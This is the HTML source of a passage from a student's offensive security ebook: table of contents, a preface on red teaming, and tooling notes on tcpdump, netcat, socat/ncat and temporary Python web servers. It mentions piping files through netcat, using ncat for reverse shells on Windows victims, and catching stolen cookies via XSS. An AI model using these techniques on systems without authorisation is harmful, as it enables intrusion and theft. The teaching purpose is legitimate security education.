@media amzn-kf8{#header,#content,#footnotes,#footer{padding:0}}
</style>
<style>
pre.rouge table td { padding: 5px; }
pre.rouge table pre { margin: 0; }
pre.rouge .cm {
  color: #999988;
  font-style: italic;
}
pre.rouge .cp {
  color: #999999;
  font-weight: bold;
}
pre.rouge .c1 {
  color: #999988;
  font-style: italic;
}
pre.rouge .cs {
  color: #999999;
  font-weight: bold;
  font-style: italic;
}
pre.rouge .c, pre.rouge .ch, pre.rouge .cd, pre.rouge .cpf {
  color: #999988;
  font-style: italic;
}
pre.rouge .err {
  color: #a61717;
  background-color: #e3d2d2;
}
pre.rouge .gd {
  color: #000000;
  background-color: #ffdddd;
}
pre.rouge .ge {
  color: #000000;
  font-style: italic;
}
pre.rouge .gr {
  color: #aa0000;
}
pre.rouge .gh {
  color: #999999;
}
pre.rouge .gi {
  color: #000000;
  background-color: #ddffdd;
}
pre.rouge .go {
  color: #888888;
}
pre.rouge .gp {
  color: #555555;
}
pre.rouge .gs {
  font-weight: bold;
}
pre.rouge .gu {
  color: #aaaaaa;
}
pre.rouge .gt {
  color: #aa0000;
}
pre.rouge .kc {
  color: #000000;
  font-weight: bold;
}
pre.rouge .kd {
  color: #000000;
  font-weight: bold;
}
pre.rouge .kn {
  color: #000000;
  font-weight: bold;
}
pre.rouge .kp {
  color: #000000;
  font-weight: bold;
}
pre.rouge .kr {
  color: #000000;
  font-weight: bold;
}
pre.rouge .kt {
  color: #445588;
  font-weight: bold;
}
pre.rouge .k, pre.rouge .kv {
  color: #000000;
  font-weight: bold;
}
pre.rouge .mf {
  color: #009999;
}
pre.rouge .mh {
  color: #009999;
}
pre.rouge .il {
  color: #009999;
}
pre.rouge .mi {
  color: #009999;
}
pre.rouge .mo {
  color: #009999;
}
pre.rouge .m, pre.rouge .mb, pre.rouge .mx {
  color: #009999;
}
pre.rouge .sa {
  color: #000000;
  font-weight: bold;
}
pre.rouge .sb {
  color: #d14;
}
pre.rouge .sc {
  color: #d14;
}
pre.rouge .sd {
  color: #d14;
}
pre.rouge .s2 {
  color: #d14;
}
pre.rouge .se {
  color: #d14;
}
pre.rouge .sh {
  color: #d14;
}
pre.rouge .si {
  color: #d14;
}
pre.rouge .sx {
  color: #d14;
}
pre.rouge .sr {
  color: #009926;
}
pre.rouge .s1 {
  color: #d14;
}
pre.rouge .ss {
  color: #990073;
}
pre.rouge .s, pre.rouge .dl {
  color: #d14;
}
pre.rouge .na {
  color: #008080;
}
pre.rouge .bp {
  color: #999999;
}
pre.rouge .nb {
  color: #0086B3;
}
pre.rouge .nc {
  color: #445588;
  font-weight: bold;
}
pre.rouge .no {
  color: #008080;
}
pre.rouge .nd {
  color: #3c5d5d;
  font-weight: bold;
}
pre.rouge .ni {
  color: #800080;
}
pre.rouge .ne {
  color: #990000;
  font-weight: bold;
}
pre.rouge .nf, pre.rouge .fm {
  color: #990000;
  font-weight: bold;
}
pre.rouge .nl {
  color: #990000;
  font-weight: bold;
}
pre.rouge .nn {
  color: #555555;
}
pre.rouge .nt {
  color: #000080;
}
pre.rouge .vc {
  color: #008080;
}
pre.rouge .vg {
  color: #008080;
}
pre.rouge .vi {
  color: #008080;
}
pre.rouge .nv, pre.rouge .vm {
  color: #008080;
}
pre.rouge .ow {
  color: #000000;
  font-weight: bold;
}
pre.rouge .o {
  color: #000000;
  font-weight: bold;
}
pre.rouge .w {
  color: #bbbbbb;
}
pre.rouge {
  background-color: #f8f8f8;
}
</style>
</head>
<body class="book">
<div id="header">
<h1>A Student&#8217;s Guide to Offensive Security Engineering</h1>
<div class="details">
<span id="author" class="author">Andrew Yu</span><br>
<span id="revnumber">version 1.0,</span>
<span id="revdate">2021-04</span>
</div>
<div id="toc" class="toc">
<div id="toctitle">Table of Contents</div>
<ul class="sectlevel1">
<li><a href="#_dedication">Dedication</a></li>
<li><a href="#_preface">Preface</a></li>
<li><a href="#_audience">Audience</a></li>
<li><a href="#_fundamentals">Fundamentals</a>
<ul class="sectlevel1">
<li><a href="#_programming_languages">Programming Languages</a></li>
<li><a href="#_bash_fundamentals">Bash Fundamentals</a></li>
<li><a href="#_x86_assembly_machine_code">x86 Assembly &amp; Machine Code</a></li>
</ul>
</li>
<li><a href="#_whoami">Whoami</a></li>
<li><a href="#_attacking_a_network">Attacking a Network</a>
<ul class="sectlevel1">
<li><a href="#_housekeeping">Housekeeping</a>
<ul class="sectlevel2">
<li><a href="#_attacking_machine">Attacking Machine</a></li>
<li><a href="#_note_taking">Note Taking</a></li>
<li><a href="#_terminal_multiplexer">Terminal Multiplexer</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#_general_tooling">General Tooling</a>
<ul class="sectlevel1">
<li><a href="#_tcpdump">tcpdump</a></li>
<li><a href="#_nc">nc</a></li>
<li><a href="#_socat_ncat">socat &amp; ncat</a></li>
<li><a href="#_powershell">Powershell</a></li>
<li><a href="#_hosting_webservers">Hosting Webservers</a></li>
</ul>
</li>
<li><a href="#_recon">Recon</a>
<ul class="sectlevel1">
<li><a href="#_open_source_intelligence_osint">Open Source Intelligence (OSINT)</a>
<ul class="sectlevel2">
<li><a href="#_harvesting_user_information">Harvesting User Information</a></li>
<li><a href="#_public_code_repositories">Public Code Repositories</a></li>
<li><a href="#_compromised_credentials">Compromised Credentials</a></li>
<li><a href="#_web_server_content">Web Server Content</a></li>
<li><a href="#_osint_services">OSINT Services</a></li>
<li><a href="#_dns_enumeration">DNS Enumeration</a></li>
</ul>
</li>
<li><a href="#_putting_it_together_osint">Putting it Together: OSINT</a></li>
<li><a href="#_service_scanning">Service Scanning</a>
<ul class="sectlevel2">
<li><a href="#_stealth_scanning_syn_scan">"Stealth" Scanning (SYN Scan)</a></li>
<li><a href="#_connect_scanning">Connect Scanning</a></li>
<li><a href="#_udp_scanning">UDP Scanning</a></li>
<li><a href="#_output_types">Output Types</a></li>
<li><a href="#_nmap_scripting_engine_nse">Nmap Scripting Engine (NSE)</a></li>
<li><a href="#_common_useful_flags">Common Useful Flags</a></li>
<li><a href="#_other_network_scanners">Other Network Scanners</a></li>
</ul>
</li>
<li><a href="#_putting_it_together_service_scanning">Putting it Together: Service Scanning</a></li>
<li><a href="#_investigating_services">Investigating Services</a>
<ul class="sectlevel2">
<li><a href="#_server_message_block_smb_netbios">Server Message Block (SMB) &amp; NetBIOS</a></li>
<li><a href="#_network_file_system_nfs">Network File System (NFS)</a></li>
<li><a href="#_simple_mail_transfer_protocol">Simple Mail Transfer Protocol</a></li>
<li><a href="#_internet_message_access_protocol_imap_post_office_protocol_3_pop3">Internet Message Access Protocol (IMAP) &amp; Post Office Protocol 3 (POP3)</a></li>
<li><a href="#_simple_network_management_protocol_snmp">Simple Network Management Protocol (SNMP)</a></li>
</ul>
</li>
<li><a href="#_putting_it_together_investigating_services">Putting it Together: Investigating Services</a></li>
</ul>
</li>
<li><a href="#_exploitation">Exploitation</a>
<ul class="sectlevel1">
<li><a href="#_msfvenom">msfvenom</a>
<ul class="sectlevel2">
<li><a href="#_staged_meterpreter_shells">Staged &amp; Meterpreter Shells</a></li>
</ul>
</li>
<li><a href="#_shells">Shells</a>
<ul class="sectlevel2">
<li><a href="#_command_line_execution_bash">Command Line Execution / Bash</a></li>
<li><a href="#_scripting_languages">Scripting Languages</a></li>
</ul>
</li>
<li><a href="#_file_transfer">File Transfer</a>
<ul class="sectlevel2">
<li><a href="#_mundane_functionality">Mundane Functionality</a></li>
<li><a href="#_certutil">Certutil</a></li>
<li><a href="#_smb">SMB</a></li>
<li><a href="#_wget">Wget</a></li>
<li><a href="#_powershell_3">Powershell</a></li>
<li><a href="#_netcat_2">Netcat</a></li>
<li><a href="#_verifying_integrity">Verifying Integrity</a></li>
</ul>
</li>
<li><a href="#_exploit_repositories">Exploit Repositories</a>
<ul class="sectlevel2">
<li><a href="#_searchsploit">searchsploit</a></li>
<li><a href="#_cross_compilation">Cross Compilation</a></li>
</ul>
</li>
<li><a href="#_putting_it_together_modifying_out_of_the_box_exploits">Putting it Together: Modifying Out-of-the-Box Exploits</a></li>
<li><a href="#_attacking_web_applications">Attacking Web Applications</a>
<ul class="sectlevel2">
<li><a href="#_web_app_recon">Web App Recon</a></li>
<li><a href="#_interesting_files">Interesting Files</a></li>
</ul>
</li>
<li><a href="#_scanners">Scanners</a>
<ul class="sectlevel2">
<li><a href="#_nikto">nikto</a></li>
<li><a href="#_whatweb">Whatweb</a></li>
<li><a href="#_nse">NSE</a></li>
<li><a href="#_cms_scanners">CMS Scanners</a></li>
<li><a href="#_sql_injections">SQL Injections</a></li>
<li><a href="#_xss">XSS</a></li>
<li><a href="#_lfirfi">LFI/RFI</a></li>
<li><a href="#_arbitrary_file_read">Arbitrary File Read</a></li>
<li><a href="#_unrestricted_file_upload">Unrestricted File Upload</a></li>
<li><a href="#_command_injection">Command Injection</a></li>
<li><a href="#_csrf">CSRF</a></li>
<li><a href="#_ssti">SSTI</a></li>
<li><a href="#_ssrf">SSRF</a></li>
<li><a href="#_bruteforce">Bruteforce</a></li>
<li><a href="#_xml_entity_injection">XML Entity Injection</a></li>
<li><a href="#_idor">IDOR</a></li>
<li><a href="#_clientside_exploits">Clientside Exploits</a></li>
</ul>
</li>
<li><a href="#_phishing">Phishing</a></li>
</ul>
</li>
<li><a href="#_privilege_escalation">Privilege Escalation</a>
<ul class="sectlevel1">
<li><a href="#_upgrading_our_shell">Upgrading our Shell</a></li>
</ul>
</li>
<li><a href="#_looting">Looting</a></li>
<li><a href="#_pivoting">Pivoting</a></li>
<li><a href="#_active_directory">Active Directory</a></li>
<li><a href="#_service_cheatsheet">Service Cheatsheet</a>
<ul class="sectlevel1">
<li><a href="#_ftp">FTP</a>
<ul class="sectlevel2">
<li><a href="#_active_vs_passive">Active vs Passive</a></li>
<li><a href="#_anonymous_login">Anonymous Login</a></li>
<li><a href="#_file_upload">File Upload</a></li>
</ul>
</li>
<li><a href="#_smb_2">SMB</a>
<ul class="sectlevel2">
<li><a href="#_recon_tools">Recon Tools</a></li>
<li><a href="#_access_share">Access Share</a></li>
<li><a href="#_eternal_blue">Eternal Blue</a></li>
</ul>
</li>
<li><a href="#_nbt">NBT</a>
<ul class="sectlevel2">
<li><a href="#_recon_tools_2">Recon Tools</a></li>
</ul>
</li>
<li><a href="#_ssh">SSH</a></li>
<li><a href="#_snmp">SNMP</a></li>
<li><a href="#_smtp">SMTP</a>
<ul class="sectlevel3">
<li><a href="#_checklist">Checklist</a></li>
</ul>
</li>
<li><a href="#_redis">Redis</a></li>
<li><a href="#_erlang">Erlang</a></li>
<li><a href="#_web_servers">Web Servers</a></li>
<li><a href="#_awf">awf</a></li>
</ul>
</li>
<li><a href="#_practice_for_red_teaming">Practice for Red Teaming</a></li>
<li><a href="#_social_engineering">Social Engineering?</a></li>
<li><a href="#_binary_exploitation">Binary Exploitation</a>
<ul class="sectlevel1">
<li><a href="#_debuggers_and_disassemblers">Debuggers and Disassemblers</a>
<ul class="sectlevel2">
<li><a href="#_the_og_buffer_overflow">The OG Buffer Overflow</a></li>
<li><a href="#_shellcode">Shellcode</a></li>
<li><a href="#_format_string_attacks">Format String Attacks</a></li>
<li><a href="#_python_format_string_attacks">Python Format String Attacks</a></li>
<li><a href="#_canaries_aslr_depnx_and_other_protections">Canaries, ASLR, DEP/NX and Other Protections</a></li>
<li><a href="#_return_oriented_programming_rop">Return-Oriented-Programming (ROP)</a></li>
<li><a href="#_exploiting_the_heap">Exploiting the Heap</a></li>
<li><a href="#_use_after_free">Use After Free</a></li>
<li><a href="#_x64_exploitation">x64 Exploitation</a></li>
</ul>
</li>
<li><a href="#_hash_cracking">Hash Cracking</a></li>
<li><a href="#_writing_malware">Writing Malware</a>
<ul class="sectlevel2">
<li><a href="#_windows">Windows</a></li>
<li><a href="#_unix">Unix</a></li>
</ul>
</li>
<li><a href="#_attacking_embedded_devices">Attacking Embedded Devices</a>
<ul class="sectlevel2">
<li><a href="#_firmware_emulation">Firmware Emulation</a></li>
<li><a href="#_jtag_and_uart">JTAG and UART</a></li>
</ul>
</li>
<li><a href="#_physical_attacks">Physical Attacks</a>
<ul class="sectlevel2">
<li><a href="#_lockpicking">Lockpicking</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#_further_learning">Further Learning</a>
<ul class="sectlevel1">
<li><a href="#_example_appendix">Appendix A: Example Appendix</a>
<ul class="sectlevel2">
<li><a href="#_appendix_sub_section">Appendix Sub-section</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#_bibliography">Bibliography</a></li>
</ul>
</div>
</div>
<div id="content">
<div id="preamble">
<div class="sectionbody">
<link rel="stylesheet"Â  href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/3.1.0/css/font-awesome.min.css">

<style>
  .imageblock > .title {
    text-align: inherit;
  }
</style>
</div>
</div>
<div class="sect1">
<h2 id="_dedication">Dedication</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Thanks to all the great people at UNSW.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_preface">Preface</h2>
<div class="sectionbody">
<div class="paragraph">
<p>As we move further and further into an interconnected digital world, computers have increasingly integrated themselves into every facet of daily life. These bits and bytes, from the extensions of our brains which we keep in our pockets to the SCADA systems we trust to monitor our nuclear reactors, now form the nervous system of our society.</p>
</div>
<div class="paragraph">
<p>The plethora of technical disciplines and experience required to be a bleeding edge developer almost guarantees that misconfigurations, security oversights and near invisible vulnerabilities will become more and more common in the digital works that power our day to day lives. This has only made competence in information and network security - both offensive and defensive - increasingly vital.</p>
</div>
<div class="paragraph">
<p>Offensive security is the art of thinking like an adversary - a "hacker". The militaries and three letter agencies of the world have long employed offensive thinking and red teams - groups that take the role of the enemy in exercises - to identify their own flaws before their opponents. The Marine Corps Gazette once described red teaming as "a bright light we shine on ourselves to expose areas where we can improve effectiveness".</p>
</div>
<div class="paragraph">
<p>Putting yourself in the shoes of an attacker is illuminating - it helps you think against convention and challenge potentially fatal assumptions. It makes the risk and impact of breaches - typically invisible and unintuitive - quantifiably clear and demonstrable; especially to higher ups.</p>
</div>
<div class="paragraph">
<p>To think like an adversary you should do and be many things; the field of digital security is a broad and multi-disciplinary one. But foremost, you should be curious. You should strive to understand that which you do not know, such that you are always learning. I learnt something from writing this, hopefully you learn something too.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_audience">Audience</h2>
<div class="sectionbody">
<div class="paragraph">
<p>This book is targeted at individuals with some exposure to red team techniques or are otherwise technically literate with Unix tooling (i.e. Students studying Security Engineering). It&#8217;s essentially a technical reference with my thoughts and high level ideas peppered throughout</p>
</div>
<div class="paragraph">
<p>Individuals completely new to offensive security may want to supplement reading with additional primer resources.</p>
</div>
</div>
</div>
<h1 id="_fundamentals" class="sect0">Fundamentals</h1>
<div class="openblock partintro">
<div class="content">
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>Most programmers learn the language from the top down and never see the big picture. Hackers get their edge from knowing how all the pieces interact within this big picture.</p>
</div>
</blockquote>
<div class="attribution">
&#8212; Jon Erickson<br>
<cite>Art of Exploitation</cite>
</div>
</div>
<div class="paragraph">
<p>There are a few fundamentals that you must be familiar with. Notably, fluency in choice programming languages. Being able to read and write code is the first (rather essential) step to being a hacker, understanding ASM mnemonics and how the underlying machine code is executed grants the insight necessary to manipulate programs. The same goes for having a solid foundation in networking.</p>
</div>
<div class="paragraph">
<p>This chapter skims "core" knowledge that will be helpful in reading this book. That being said, competency with these skills is <strong>not essential</strong> to following the material covered, but <strong>highly, highly</strong> recommended. Understanding how the low level pieces fit together is vital to an offensive security mindset.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_programming_languages">Programming Languages</h2>
<div class="sectionbody">
<div class="paragraph">
<p>C is one of the most widely used programming languages, a lingua franca of sorts. Since its inception in 1972 it has come to power most of the modern world; virtually all operating systems are written in a mix of C and Assembly and the same can be said for practically anything digital when you look at the upstream implementation. C is a fairly low-level-high-level language and understanding C means understanding how things work under the hood - critical for any hacker. Moreover, most higher level programming languages have evolved from C and thus share in its principles such as loop control structures and the argument vector.
Being able to read C affords a general programming fluency.</p>
</div>
<div class="paragraph">
<p>However, when it comes to writing our tools and exploits, we usually prefer something that is quick to write, easy to debug and largely architecture independant. Scripting languages fill this niche nicely - notable languages popular in the security sphere include Ruby, Go, and Python. The differences are largely superficial (at least to us - pick your poison), although I&#8217;ll be writing with Python as it is what I&#8217;m most familiar with.</p>
</div>
<div class="paragraph">
<p>Python and other such scripting languages enable quicker development (by design and from the greater netsec library support), generally better readibility, cross platform stability and more rapid debugging at the cost of having greater overhead than lower level languages (like C). This tradeoff is great for our purposes, allowing us to script tools, exploits and frameworks on the fly. You will also often find yourself using a scripting language one liner in the terminal to create strings or perform otherwise menial tasks (like printing non ascii characters into STDIN).</p>
</div>
<div class="paragraph">
<p>TODO
pwntools
other useful libs like scapy</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_bash_fundamentals">Bash Fundamentals</h2>
<div class="sectionbody">
<div class="paragraph">
<p>TODO</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_x86_assembly_machine_code">x86 Assembly &amp; Machine Code</h2>
<div class="sectionbody">
<div class="paragraph">
<p>TODO</p>
</div>
</div>
</div>
<h1 id="_whoami" class="sect0">Whoami</h1>
<div class="openblock partintro">
<div class="content">
<div class="paragraph">
<p>&#8230;&#8203;
Image,
Uni &#8230;&#8203;</p>
</div>
<div class="paragraph">
<p>&#8230;&#8203;
OS-101-46522</p>
</div>
<div class="paragraph">
<p><a href="https://ohxeighty.github.io/" class="bare">https://ohxeighty.github.io/</a></p>
</div>
<div class="paragraph">
<p>Git &#8230;&#8203;</p>
</div>
</div>
</div>
<h1 id="_attacking_a_network" class="sect0">Attacking a Network</h1>
<div class="openblock partintro">
<div class="content">
<div class="paragraph">
<p>An attack on a network is quite a broad thing. It can be anything from a small intrusion like website defacement, to year long campaigns orchestrated by well funded "nation state actors" - attackers organised under a state apparatus.</p>
</div>
<div class="paragraph">
<p>For the purposes of this book, we will focus on the phases of a classic contracted red team engagement with minimal considerations for the activities of any defenders ("blue teams").</p>
</div>
<div class="paragraph">
<p>Before the engagement starts the Rules of Engagement need to be set out with the client &lt;&#8230;&#8203;&gt;</p>
</div>
<div class="admonitionblock important">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<strong>Do not break the Rules of Engagement. Ever. Jail is in fact not epic.</strong>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>When we look to breach a network we usually have one or more of the following goals:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>Obtaining proof of compromise</p>
</li>
<li>
<p>Obtaining root level access to privileged machines and networks</p>
</li>
<li>
<p>Maintaining persistence</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>Speaking from a high level, we commence the engagement with reconnaissance. We look to gather as much information on our target as possible - first passively using public sources, then actively with service enumeration.</p>
</div>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<i class="fa icon-note" title="Note"></i>
</td>
<td class="content">
<div class="paragraph">
<p>It is difficult to overstate the importance of good recon in an engagement. Recon informs every subsequent stage of an attack and having the right data is crucial to locating vulnerabilties and constructing exploits.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>We use this information to construct an attack surface of the victim - the sum of all possible entry points into a network. We probe this surface for vulnerabilities and misconfigurations then construct exploits and payloads to eventually grant us remote code execution (RCE) on a victim machine.</p>
</div>
<div class="paragraph">
<p>Most times RCE leads to an interactive shell from where we look to escalate our privileges on the local machine or pivot to another endpoint on the network. It is during this period where most objectives (as set by the RoE) are accomplished (e.g. obtaining domain admin in an active directory, demonstrating full compromise).</p>
</div>
<div class="paragraph">
<p>Now comes the most important part of the engagement - the report. Being able to communicate our findings is just as critical (if not more) as having the skills to find them in the first place. The report is where we actually provide value to the client and at the end of the day, is what they&#8217;re paying for.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_housekeeping">Housekeeping</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_attacking_machine">Attacking Machine</h3>
<div class="paragraph">
<p>Our primary attacking machine will be where we conduct most of our offensive work. OS wise, I recommend a distribution of Linux for ease of customisation. Additionally, a majority of offensive tooling is designed for linux systems.</p>
</div>
<div class="paragraph">
<p>Having access to multiple systems is likewise recommended, whether via multiple physical devices or virtual machines. Having the environments to compile exploits and other binaries natively is preferred to cross-compilation toolchains. The same goes for running tools without having to emulate.</p>
</div>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<i class="fa icon-note" title="Note"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Bootable offensive images, such as Kali Linux Live, are also handy to flash onto USBs and bring on physical engagements.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Our attack box should be clean of any sensitive information to maintain proper hygeine and operational security (OPSEC). We should always assume that our machine <strong>will</strong> be compromised; the last thing we want is to leak sensitive client information (That being said, we should harden our attack box where possible).</p>
</div>
</div>
<div class="sect2">
<h3 id="_note_taking">Note Taking</h3>
<div class="paragraph">
<p>Taking notes while working is crucial to focus our efforts and document our methodology to eventually report to the client - we should collate information gained, techniques employed and loot&#8230;&#8203; looted. Think of it like commenting code.</p>
</div>
<div class="paragraph">
<p>A wide variety of note taking packages exist and it all comes down to personal preference. Some examples include ObsidianMD, CherryTree and Bookstack. Just make sure your software of choice has full offline support. Sensitive information should not be finding its way to the cloud&#8230;&#8203;</p>
</div>
</div>
<div class="sect2">
<h3 id="_terminal_multiplexer">Terminal Multiplexer</h3>
<div class="paragraph">
<p>Most modern Unix terminal emulators like xterm have some support for multiplexing (usually via a tabbing systems) but for more fully fledged solutions we can turn to packages like tmux and terminator. While it is a personal preference, these solutions have multiple features that make my life easier:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>Multiplexed terminal windows that drastically improve my workflow. It allows me to switch between contexts (e.g. a scanning context, a web exploitation context &#8230;&#8203;) each with several panes running different tools or with different outputs.</p>
</li>
<li>
<p>Customisable history buffer, really great for documentation and making sure we have absolutely everything on paper in one form or another.</p>
</li>
<li>
<p>Vim hotkey support.</p>
</li>
<li>
<p>Plugins, Plugins, Plugins.</p>
</li>
</ul>
</div>
</div>
</div>
</div>
<h1 id="_general_tooling" class="sect0">General Tooling</h1>
<div class="sect1">
<h2 id="_tcpdump">tcpdump</h2>
<div class="sectionbody">
<div class="paragraph">
<p><code>tcpdump</code> is a commandline network sniffer used to capture traffic and analyze capture files.</p>
</div>
<div class="paragraph">
<p>To parse a pcap file:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">tcpdump -r &lt;CAPTURE FILE&gt;</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>When in capture mode, we invoke <code>-i</code> to specify the interface to listen on (defaults to lowest). <code>-c</code> determines the number of packets to capture while the <code>-w</code> flag saves the packets to a capture. Also helpful is <code>-n</code>, which signals not to perform DNS lookup (i.e. we get the IP).</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">tcpdump -i wlan0 -c 100 -w capture.pcap</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We can format the packet display with the <code>-X</code> flag, which prints data in both hex and ASCII, while <code>-A</code> dumps packets to only ASCII.</p>
</div>
<div class="paragraph">
<p>To get more use out of tcpdump, we can apply filters with keywords and combine them with boolean logic.
For example, to only show packets from a specific host we would apply a source filter - <code>src host 10.10.10.10</code>, while to show only (mostly rather) web server traffic we would apply a filter to port 80 - <code>port 80</code>. We could then combine these filters and at the same time, filter out traffic to an uninteresting server:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">tcpdump -r log.pcap -Xn src host 10.10.10.10 and port 80 and not dst host 10.10.10.11</span></code></pre>
</div>
</div>
<div class="admonitionblock tip">
<table>
<tr>
<td class="icon">
<i class="fa icon-tip" title="Security Pattern"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Sometimes, when exploits don&#8217;t seem to work for no apparent reason, or things just don&#8217;t add up, we can work from first principles.</p>
</div>
<div class="paragraph">
<p>Analyzing network traffic is a big part of this - tools like tcpdump and wireshark are instrumental in helping us build up a bigger picture from the small puzzle pieces.</p>
</div>
<div class="paragraph">
<p>Packets (almost) never lie.</p>
</div>
</td>
</tr>
</table>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_nc">nc</h2>
<div class="sectionbody">
<div class="paragraph">
<p><code>nc</code> (netcat) is a network utility for reading and writing to sockets. It can handle pretty much all the manual connections we require and is useful for manually enumerating &amp; exploiting services. Its the defacto swiss army knife of networking.</p>
</div>
<div class="paragraph">
<p>In its simplest usage, we can connect to a host and port by specifying them. I also recommend usage of verbose mode with <code>-v</code> most of the time - so we have stdout indicators when we connect (and are connected to).</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">nc &lt;IP&gt;</span><span class="w"> </span>&lt;PORT&gt;</code></pre>
</div>
</div>
<div class="paragraph">
<p>Our standard input is then sent over the wire and the response sent back to standard out.</p>
</div>
<div class="paragraph">
<p>Netcat can also function as a listening server - invoked with <code>-lp &lt;PORT&gt;</code>.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">nc -lp &lt;PORT&gt;</span></code></pre>
</div>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>There are multiple common implementations of netcat that are used (GNU and OpenBSD among others). Unhelpfully enough, the switches vary. Check your man docs.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Netcat also supports connecting and listening over UDP with the <code>-u</code> flag.</p>
</div>
<div class="paragraph">
<p>We most commonly use netcat to probe plaintext protocols (e.g. SMTP) or initiate and catch shells. Another common use case is file transfer with pipes:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:/tmp#</span><span class="w"> </span><span class="nb">cat test</span> | nc 127.0.0.1 6990
<span class="go">^C</span></code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:/tmp#</span><span class="w"> </span>nc <span class="nt">-vlp</span> 6990 <span class="o">&gt;</span> out
<span class="go">Listening on 0.0.0.0 6990
Connection received on localhost 36248
</span><span class="gp">root@Guest:/tmp#</span><span class="w"> </span><span class="nb">cat </span>out
<span class="go">test file</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Additionally, when netcat is compiled with the <code>GAPING_SECURITY_HOLE</code> flag, the <code>-e</code> switch will connect netcat to a process' IO stream. (It was considered a security hole since most vendors would probably package nc as setuid, allowing privilege escalation).</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_socat_ncat">socat &amp; ncat</h2>
<div class="sectionbody">
<div class="paragraph">
<p><code>socat</code> is a powerful tool which allows for bidirectional byte streams &amp; piping, which works with sockets. <code>ncat</code> is a "much improved reimplementation" of netcat (supporting chaining, redirection and proxying) that ships with <code>nmap</code> - it also comes with a handy standalone <code>ncat</code> executable that we can drop onto Windows' victims to setup a reverse shell.</p>
</div>
<div class="paragraph">
<p>Both packages support SSL/TLS. Other tools also allow us to implement a SSL/TLS secured shell - such as the <code>s_client</code> and <code>s_server</code> utilities available in the openssl suite.</p>
</div>
<div class="paragraph">
<p>Getting familiar with these tools is highly recommended.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_powershell">Powershell</h2>
<div class="sectionbody">
<div class="paragraph">
<p>TODO: Powah</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_hosting_webservers">Hosting Webservers</h2>
<div class="sectionbody">
<div class="paragraph">
<p>TODO: Apache</p>
</div>
<div class="paragraph">
<p>We can also employ scripting languages to spin up temporary web servers. For example, we can execute Python&#8217;s <code>SimpleHTTPServer</code> on an arbitrary port to serve the current working directory as a web server:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">SimpleHTTPServer</span> <span class="mi">80</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Or Python 3&#8217;s more recent <code>http.server</code>:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">80</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Having web servers is convenient for file transfer (allowing us to host shells &amp; exploit code) as well as for some clientside attacks (e.g. Using our web server as a request bin to steal cookies via XSS).</p>
</div>
</div>
</div>
<h1 id="_recon" class="sect0">Recon</h1>
<div class="openblock partintro">
<div class="content">
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>If you know your enemies and know yourself, you will not be imperiled in a hundred battles.</p>
</div>
</blockquote>
<div class="attribution">
&#8212; Sun Tzu<br>
<cite>The Art of War</cite>
</div>
</div>
<div class="paragraph">
<p>With the obligatory Sun Tzu quote out of the way, let&#8217;s get into reconnaissance.</p>
</div>
<div class="paragraph">
<p>The recon phase of a pentest broadly involves fingerprinting users and services on hosts in the network and scraping as much information as possible. We want to find all the assets in scope and identify a path to getting a foothold on the system. To attackers, services and clients represent vectors for intrusion; through misconfigurations, poor patching policies and vulnerable proprietary code (to name a few) attackers gain access to endpoints in the network. To identify these weak links in the chain we build up a profile of the target network â the foundation often being a port scan to enumerate which services listen on which hosts on what ports.</p>
</div>
<div class="paragraph">
